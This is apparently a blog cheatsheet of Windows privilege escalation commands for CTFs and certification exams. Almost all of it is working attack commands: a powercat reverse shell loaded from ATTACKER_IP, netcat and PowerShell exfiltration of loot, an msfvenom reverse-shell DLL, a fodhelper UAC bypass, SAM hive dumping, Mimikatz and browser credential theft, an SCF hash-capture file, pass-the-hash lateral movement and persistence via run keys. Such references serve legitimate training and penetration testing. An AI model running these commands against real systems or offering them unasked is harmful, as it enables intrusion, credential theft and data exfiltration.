---
title: Windows Privilege Escalation Cheatsheet
published: 2026-06-07
updated: 2026-06-07
description: Cheatsheet for windows privilege escalation during CTFs and Exams.
image: windows.png
tags:
  - windows
  - cheatsheet
  - privesc
category: Cheatsheet
draft: false
---
## 0. Initial Access, Shell Stabilization & File Transfer

### Shell Setup & Flag Acquisition

**Un-truncate Terminal Output:**

- **PowerShell:** `| Format-Table -Wrap` or `| Out-String -Width 4096`
    
- **CMD:** Properties > Layout > Increase Screen Buffer Width
    

**Aliases:**

- **PowerShell:** `function ll { Get-ChildItem -Force }`
    
- **CMD:** `doskey ll=dir /a /r /q`
    

**Immediate Admin Actions:**

- `net localgroup administrators $USER /add` (Add user to admin group)
    
- **Powercat Reverse Shell:** `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:80/powercat.ps1'); powercat -c <ATTACKER_IP> -p 443 -e powershell"`
    

**Flag & File Acquisition:**

- **Tree View:** `tree /F /A C:\Users\`
    
- **CMD Search:** * `dir /s /b c:\proof.txt`
    
    - `dir /s /b c:\local.txt`
        
    - `where /R c:\ proof.txt`
        
- **PowerShell Search:** * `Get-ChildItem -Path C:\Users -Include *proof.txt*,*local.txt* -Recurse -ErrorAction SilentlyContinue`
    
    - `gci -Path C:\ -Recurse -Filter *proof.txt* -ea 0`
        
- **Hidden Files Check:**
    
    - CMD: `dir /a:h` or `dir /a:h /s /b C:\` or `dir /s/b *.log`
        
    - PowerShell: `ls -fo` or `Get-ChildItem -Path C:\ -Force -Recurse -ErrorAction SilentlyContinue`
        

### File Transfer (Inbound to Target)

- **PowerShell:** `iwr -uri "http://192.168.45.x/file.exe" -OutFile "C:\Windows\Temp\file.exe"` OR `wget "http://192.168.45.x/file.exe" -o "file.exe"`
    
- **CertUtil (Native CMD):** `certutil -urlcache -split -f "http://192.168.45.x/file.exe" file.exe`
    
- **SMB Share:** * Attacker: `impacket-smbserver share /path/to/tools -smb2support`
    
    - Target: `copy \\<ATTACKER_IP>\share\winpeas.exe C:\Windows\Temp\winpeas.exe`
        
- **VBScript (Legacy):**
    
    DOS
    
    ```
    echo strUrl = WScript.Arguments.Item(0) > wget.vbs
    echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
    echo Const HTTPREQUEST_PROXYSET = 2 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
    echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
    echo Err.Clear >> wget.vbs
    echo Set http = Nothing >> wget.vbs
    echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
    echo http.Open "GET", strUrl, False >> wget.vbs
    echo http.Send >> wget.vbs
    echo varByteArray = http.ResponseBody >> wget.vbs
    echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
    echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
    echo ts.Write(varByteArray) >> wget.vbs
    echo ts.Close >> wget.vbs
    cscript wget.vbs http://192.168.45.x/nc.exe nc.exe
    ```
    

### Exfiltration (Outbound to Attacker)

- **SMB Server:** `copy C:\path\to\loot.txt \\<ATTACKER_IP>\share\`
    
- **Netcat:** * Attacker: `nc -lvnp 4444 > loot.zip`
    
    - Target: `nc.exe <ATTACKER_IP> 4444 < C:\path\to\loot.zip`
        
- **PowerShell (Base64 POST):**
    
    PowerShell
    
    ```
    $file = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.zip"))
    Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $file
    ```
    

---

## 1. System & Environment Enumeration

|**Tool**|**Command**|
|---|---|
|**SystemInfo**|`systeminfo \| findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`|
|**WMIC**|`wmic os get Caption,CSDVersion,OSArchitecture,Version`|

**Environment Variables (DLL Hijacking Potential):**

- CMD: `set` or `echo %PATH%`
    
- PowerShell: `Get-ChildItem Env: | Format-Table -Wrap`
    

**PowerShell Constraints & AppLocker:**

- Language Mode Check: `$ExecutionContext.SessionState.LanguageMode` (If `ConstrainedLanguage`, bypass via `installutil.exe` or `msbuild.exe`)
    
- AppLocker Policy: `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
    
    - _Bypass Note:_ If AppLocker is active, attempt placing binaries in `C:\Windows\System32\spool\drivers\color`.
        

---

## 2. Network & Routing Enumeration

|**Command**|**Purpose**|
|---|---|
|`ipconfig /all`|View adapters, DNS, gateways.|
|`arp -a`|ARP table to identify active hosts on subnet.|
|`route print`|Routing table for accessible pivoting subnets.|
|`netstat -ano`|Active connections, listening ports, PIDs.|
|`netstat -ano \| findstr "LISTENING" \| findstr "127.0.0.1"`|Look for internal-only ports (`127.0.0.1` or `::1` like 3306, 8080).|
|`net share`|Enumerate locally shared folders.|
|`net view /all /domain`|Domain-joined computers with shares.|
|`net view \\<hostname>`|Accessible shares on specific target.|
|`netsh advfirewall firewall show rule name=all`|Display firewall rules (CMD).|
|`Get-NetFirewallRule \| select DisplayName, Enabled, Direction`|Display firewall rules (PowerShell).|

**Pivoting & Tunneling Tools:**

- **Chisel:** Attacker: `chisel server -p 8000 --reverse` | Target: `chisel client <ATTACKER_IP>:8000 R:socks`
    
- **Ligolo-ng:** Modern standard for OSCP pivoting.
    

---

## 3. User, Group & Domain Enumeration

### Current User Privileges

- `whoami /priv`
    
- `whoami /groups`
    

|**Privilege**|**Potential Exploit / Action**|
|---|---|
|`SeImpersonatePrivilege`|Potato Exploits (PrintSpoofer, GodPotato).|
|`SeDebugPrivilege`|LSASS Memory Dump.|
|`SeBackupPrivilege`|Read SAM/SYSTEM hives.|
|`SeRestorePrivilege`|Reference.|
|`SeLoadDriverPrivilege`|Reference / Print Operators group.|
|`SeTakeOwnershipPrivilege`|Reference.|
|`SeMachineAccountPrivilege`|Domain Privilege Escalation.|

**Access Checks & Tokens:**

- Named Pipes: `pipelist.exe /accepteula` or `gci \\.\pipe\`
    
- DACL Check: `accesschk.exe /accepteula \\.\Pipe\lsass -v`
    
- **FullPowers:** Use if privileges are missing but you are in a service account.
    

### Local User Enumeration

- `net localgroup administrators` (List local admins)
    
- `net localgroup "Remote Management Users"`
    
- `net localgroup "Remote Desktop Users"`
    
- `net user <username>`
    
- `wmic useraccount get name,sid,description`
    
- `query user` or `qwinsta` (Find logged-in users for token theft)
    
- `Get-LocalUser | Select *`
    
- `Get-LocalGroupMember -Group "Administrators"`
    

### Domain Enumeration (Quick Hits without RSAT)

- `set USERDNSDOMAIN` & `set LOGONSERVER` (Check if domain joined)
    
- `net accounts /domain` (Password policy and lockouts)
    
- `net group /domain` (List AD groups)
    
- `net group "Domain Admins" /domain` (Target list)
    
- `nltest /dclist:%USERDNSDOMAIN%` or `net time /domain` (Identify DCs)
    
- `nltest /domain_trusts` (Enumerate trusts)
    
- `net view \\TargetComputer /all` (Check Admin shares for lateral movement)
    

### Advanced Domain Enumeration (.NET & AD)

```PowerShell
# Native .NET ADSI Searcher
([adsisearcher]"(&(objectClass=user)(objectCategory=person))").FindAll().Properties.name
([adsisearcher]"(&(objectClass=group)(name=Domain Admins))").FindOne().Properties.member
([adsisearcher]"(&(objectClass=user)(name=svc_sql))").FindOne().Properties
([adsisearcher]"objectClass=computer").FindAll().Properties.name

# AD Recycle Bin Group (If a member, extract deleted objects)
Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
```

**Active Directory Exploitation Tools:**

- **BloodHound:** `Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName loot.zip`
- **Kerberoasting / AS-REP Roasting (Rubeus):**
    - `Rubeus.exe kerberoast /outfile:hashes.txt`
    - `Rubeus.exe asreproast /outfile:hashes.txt`

---

## 4. The "Quick Hits" & Anomaly Checks

_Focus: What makes this box different from a default installation?_

- **Non-Standard Processes:**
    
    - `Get-Process | Where-Object { $_.Path -notlike "C:\Windows\*" -and $_.Path -ne $null } | Select-Object Name, Id, Path`
        
    - `wmic process get name,executablepath,processid | findstr /v /i "C:\Windows\\"`
        
- **Non-Standard Services:** `wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"`
    
- **Lazy Admin Registry Check (AlwaysInstallElevated):**
    
    - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
        
    - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
        
    - _(If 0x1, ANY .msi file runs as SYSTEM)_
        

---

## 5. Process, Application & Service Analysis

### Process Command Line Analysis (Critical)

_Admins often pass passwords as arguments when launching scripts._

- **PowerShell (Modern approach):** `Get-Process -IncludeUserName | Select-Object Id, ProcessName, UserName, Path`
    
- **WMI Object (Extracts exact script paths/args):** * `Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine`
    
    - `Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine, @{Name="User";Expression={$_.GetOwner().User}}`
        
- **CMD Context:**
    
    - `tasklist /v` or `tasklist /svc` (Shows User Context)
        
    - `wmic process get processid,name,commandline`
        
    - `wmic process get caption,commandline,processid | findstr /i "password"`
        

### Non-Standard Applications & Paths

- **32-bit Apps on 64-bit Systems (Older libraries):**
    
    - `dir "C:\Program Files (x86)"`
        
    - `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
        
    - `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
        
- **Portable Apps in User Dirs:** `Get-ChildItem -Path C:\Users\ -Include *.exe,*.bat,*.vbs -Recurse -ErrorAction SilentlyContinue`
    

### Service Enumeration & Misconfigurations

- **Running Services & Users:** `wmic service get name,pathname,startname`
    
- **Unquoted Service Paths:** `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`
    
- **Service Permissions (Can you restart/modify it?):**
    
    - `accesschk.exe -uwcqv "Authenticated Users" *`
        
    - `sc qc <servicename>`
        
    - `sc query <servicename>`
        
    - `sc sdshow <ServiceName>` (Look for A=Allow, WP=Write Property)
        
    - `Get-Acl -Path HKLM:\System\CurrentControlSet\Services\<ServiceName> | fl`

### Scheduled Tasks Running as SYSTEM / Admins

```Python
schtasks /query /fo LIST /v | findstr /i "Run As User:"
tasklist /v | findstr /i "SYSTEM"
```

### PowerShell-Watch Integration (Dynamic Enumeration)

- **New Processes:** `Get-Process | wc -Diff -Cont -Property Id`
    
- **Args:** `Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | wc -Diff -Cont -Property ProcessId`
    
- **Ports:** `Get-NetTCPConnection | wc -Diff -Cont`
    
- **Services:** `Get-Service | wc -Diff -Cont -Property Status`
    
- **Files:** `Watch-Command { Get-Content C:\Path\file.txt } -Diff -Cont`
    

---

## 6. File Hunting & Sensitive Data Search

### Search Syntax Reference

- **CMD (`findstr`):** * `findstr /s /i /n /c:"specific string" *.*` (Flags: `/s` recursive, `/i` ignore case, `/n` line numbers, `/c` literal string, `/m` filename only).
    
- **PowerShell (`Select-String`):** * `Get-ChildItem -Recurse | Select-String "search_term" -List` (List stops after first match).
    

### Targeted Credential & Key Hunting

- **SSH / Git:**
    
    - `dir /s /b C:\Users\id_rsa`
        
    - `dir /s /b C:\Users\id_dsa`
        
    - `dir /s /b C:\Users\.gitconfig`
        
- **Password Managers & DBs:**
    
    - `dir /s /b C:\Users\*.kdbx`
        
    - `dir /s /b C:\Users\*.rdp`
        
    - `Get-ChildItem -Path C:\Users\*, C:\inetpub\*, C:\wampp64\*, C:\xampp\* -Include *cred*,*pass*,*.config,*.ibd,*.xml,*.kdbx,unattend.* -Recurse -ErrorAction SilentlyContinue`
        
- **Configs & Passwords:**
    
    - `findstr /siM "password" C:\inetpub\wwwroot\*.config C:\xampp\*.ini C:\ProgramData\*.xml`
        
    - `cd C:\ & findstr /siM "password" *.xml *.ini *.txt *.config 2>nul`
        

### History, Logs & Clipboard

- **PowerShell History:** * `type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
    
    - `Get-History`
        
- **Transcripts:** `type C:\Users\Public\Transcripts\transcript01.txt`
    
- **Clipboard:** `Get-Clipboard`
    
- **WSL (Windows Subsystem for Linux):**
    
    - `where bash` / `wsl.exe -l -v`
        
    - `wsl.exe -u root cat /root/.bash_history`
        
    - `wsl.exe -u root cat /root/.ssh/id_rsa`
        
- **Event Logs:**
    
    - `wevtutil qe Security /rd:true /f:text /r:share01 /u:user /p:pass | findstr "/user"`
        
    - `Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`
        
    - `Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104}` (Script Block Logging)

```PowerShell
(Get-PSReadlineOption).HistorySavePath
```


### Browsers & Session Managers

- `cmdkey /list` (If creds found, execute: `runas /savecred /user:domain\user "COMMAND HERE"`)
    
- `vaultcmd /listcreds:"Web Credentials"`
    
- `netsh wlan show profile name="PROFILE_NAME" key=clear | findstr /i "Key Content"`
    
- **SQLite DBs:**
    
    - `dir /s /b C:\Users\%USERNAME%\AppData\Local\Google\Chrome\"User Data"\Default\Login Data`
        
    - `dir /s /b C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\"User Data"\Default\Login Data`
        
- **Automated Extractors:** 
	- `.\SharpChrome.exe logins /unprotect`, `Invoke-SessionGopher -Thorough`
	- **LaZagne:** Use LaZagne for automated parsing of browser and session manager credentials.
    

---

## 7. Registry, ACLs & Misconfigurations

**Saved Passwords in Registry:**

- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`
    
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon`
    
- `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`
    
- `reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh`


**System Defenses & Weak Configs:**

- **LSA Protection (RunAsPPL):** `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL` (If 1, Mimikatz LSASS dump fails).
    
- **UAC Config:** * `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin`
    
    - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`
        
- **WSUS Spoofing:**
    
    - `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer`
        
    - `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` (If WUServer is HTTP and UseWUServer is 1, intercept updates).
        

**Advanced Permission Analysis (ACL Dump):**

Look for `FileSystemRights` set to FullControl, Modify, or Write for your group.

- `Get-Acl -Path "C:\Program Files\VulnerableApp" | Select-Object -ExpandProperty Access`
    
- `Get-Acl -Path "HKLM:\SOFTWARE\VulnerableApp" | Select-Object -ExpandProperty Access`
    

---

## 8. Privilege Escalation Execution

### Direct Execution Vectors

| **Vulnerability**              | **Execution Command**                                                                                                              |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------- |
| **AlwaysInstallElevated**      | `msiexec /quiet /qn /i C:\Temp\payload.msi`                                                                                        |
| **SeBackupPrivilege**          | `reg save HKLM\SAM C:\Temp\sam.save` & `reg save HKLM\SYSTEM C:\Temp\system.save` & `reg save HKLM\SECURITY C:\Temp\security.save` |
| **Unquoted Service Path**      | Place payload mimicking the broken path (e.g., `C:\Program.exe`). Restart service.                                                 |
| **Token Impersonation**        | List: `.\incognito.exe list_tokens -u`<br><br>Exec: `.\incognito.exe execute -c "domain\user" C:\Windows\system32\cmd.exe`         |
| **Check for existing backups** | `dir %SYSTEMROOT%\repair\SAM`<br><br>`dir %SYSTEMROOT%\System32\config\RegBack\SAM`                                                |
|                                |                                                                                                                                    |

### Service Manipulation

- **Modifying Service Registry (ImagePath):**

```Python
reg add HKLM\SYSTEM\CurrentControlSet\services\<ServiceName> /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\Temp\payload.exe /f
sc start <ServiceName>
```

- **Blind Executable Hijacking:**
    
    1. Verify Write Access: `icacls "C:\Path\Tracker.exe"`
        
    2. Backup: `move Tracker.exe Tracker.bak`
        
    3. Swap: Upload reverse shell named `Tracker.exe`.
        
    4. Trigger: Wait for task, reboot (`shutdown /r /t 0`), or restart service.
        

### DLL Hijacking Methodology

1. Identify processes attempting to load missing DLLs from user-writable directories.
    
2. Verify write permissions: `icacls C:\target\directory`
    
3. Compile payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > target.dll`
    
4. Place in vulnerable path and restart the service/application.
    

### Token Impersonation (Potato Exploits)

Exploits `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

- **PrintSpoofer (Win 10 / Server 2016+):** `PrintSpoofer.exe -i -c cmd.exe`
    
- **GodPotato (Modern / .NET):** `GodPotato -cmd "cmd.exe /c whoami"`
    
- **RoguePotato (No Print Spooler):** `RoguePotato.exe -r 10.10.10.10 -e "C:\Windows\Temp\reverse.exe" -l 9999`
    
- **JuicyPotato:** Windows 7 / Server 2008.
    

### UAC Bypasses (Fodhelper)

Escalate from medium-integrity admin to high-integrity admin.

```Python
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Temp\payload.exe" /f
fodhelper.exe
```

### Social Engineering & Kernel Exploits

- **LNK / SCF Bomb (Network Poisoning):** Drop via `IconFile=\\ATTACKER_IP\share\legit.ico` and capture hashes with Responder.
    
- **Kernel Exploits (Fallback):** Run `Windows-Exploit-Suggester` locally. Targets include MS15-051, MS16-032, and CVE-2021-36934 (SeriousSAM).
    
- **Full LNK / SCF Bomb Payload:** Place in accessed shares, run responder.

```Ini, TOML
    [Shell]
    Command=2
    IconFile=\\10.10.14.3\share\legit.ico
    [Taskbar]
    Command=ToggleDesktop
```

- **Internal Web Apps:** Enumerate `C:\inetpub\wwwroot` or `C:\xampp\htdocs`. IIS processes often possess `SeImpersonatePrivilege` by default.
    

---

## 9. Persistence & Scheduled Tasks

### Scheduled Tasks

Identify tasks running as SYSTEM or other high-privilege accounts executing writable scripts.

- **CMD Enum:** * `schtasks /query /fo LIST /v | findstr /v /i "Microsoft"`
    
    - `schtasks /query /fo LIST /v | findstr /i "TaskToRun" | findstr /v /i "C:\Windows"`
        
- **PowerShell Enum:** * `Get-ScheduledTask | Where-Object { $_.Author -notlike "*Microsoft*" } | Select-Object TaskName, State, Author`
    
    - `Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" } | ForEach-Object { $_.Actions } | Select-Object Execute, Arguments`
        
- **Exploitation:** Verify `icacls`, overwrite target binary, wait or trigger via `schtasks /run /tn "TaskName"`.
    

### Startup Applications & Run Keys

Scripts/Executables triggered on login. If `BUILTIN\Users` has write access, drop a payload here to execute upon next Admin login.

- **Run Keys:**
    
    - `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
        
    - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
        
    - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
        
- **Startup Folders:**
    
    - `icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"` (Global)
        
    - `icacls "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"` (Local)
        

---

## 10. Lateral Movement & Hash Cracking

### Lateral Movement (Impacket Suite)

- **psexec.py (Leaves artifacts/service):** `impacket-psexec DOMAIN/User:Password@<IP>` OR `impacket-psexec DOMAIN/User@<IP> -hashes LM:NTLM`
    
- **wmiexec.py (Stealthier, uses WMI):** `impacket-wmiexec DOMAIN/User:Password@<IP>` OR `impacket-wmiexec DOMAIN/User@<IP> -hashes LM:NTLM`
    
- **smbexec.py (Alternative local service):** `impacket-smbexec DOMAIN/User:Password@<IP>` OR `impacket-smbexec DOMAIN/User@<IP> -hashes LM:NTLM`
    

### Evil-WinRM (Requires Port 5985/5986)

- Cleartext: `evil-winrm -i <IP> -u User -p Password`
    
- Pass-the-Hash: `evil-winrm -i <IP> -u User -H <NTLM_HASH>`
    

### RDP

- `xfreerdp /v:<IP> /u:User /p:Password /d:DOMAIN /dynamic-resolution`
    
- Enable RDP locally (Requires Admin):

```Python
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net start termservice
net localgroup "Remote Desktop Users" User /add
```


### Hash Cracking (Hashcat)

|**Hash Type**|**Hashcat Mode (-m)**|**Command Structure**|
|---|---|---|
|**NTLM**|`1000`|`hashcat -m 1000 hashes.txt rockyou.txt`|
|**NetNTLMv2** (Responder/LNK)|`5600`|`hashcat -m 5600 hashes.txt rockyou.txt`|
|**Kerberoast** (TGS-REP)|`13100`|`hashcat -m 13100 hashes.txt rockyou.txt`|
|**AS-REP Roast**|`18200`|`hashcat -m 18200 hashes.txt rockyou.txt`|

---

## 11. Automated Tools & "Out-Of-WinPEAS" Logic

**Standard Tools:**

- **WinPEAS:** `winpeas.exe quiet servicesinfo userinfo`
    
- **PrivescCheck:** `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"`
    
- **PowerUp:** `. .\PowerUp.ps1` -> `Invoke-AllChecks`
    
- **Mimikatz & SharpDPAPI:** `privilege::debug`, `token::elevate`, `lsadump::sam`, `sekurlsa::logonpasswords`, `.\SharpDPAPI.exe machinecredentials`
    

**Out-Of-WinPEAS (What WinPEAS Misses):**

- **Real-Time Execution:** WinPEAS misses scheduled tasks that run and terminate quickly. Use `Get-Process | wc -Diff -Cont -Property Id`.
    
- **Command Line Arguments:** WinPEAS misses credentials passed in scripts dynamically. Use `Get-CimInstance Win32_Process ...`.
    
- **WSL & Custom DBs:** WinPEAS misses `.bash_history` inside WSL and often ignores browser SQLite databases.
    
- **Advanced Logging:** WinPEAS does not parse Event ID 4104 (Script Block Logging) or 4688 (Process Creation).
    
- **Active Directory:** WinPEAS has zero domain visibility. Use BloodHound and `nltest`.
    

---

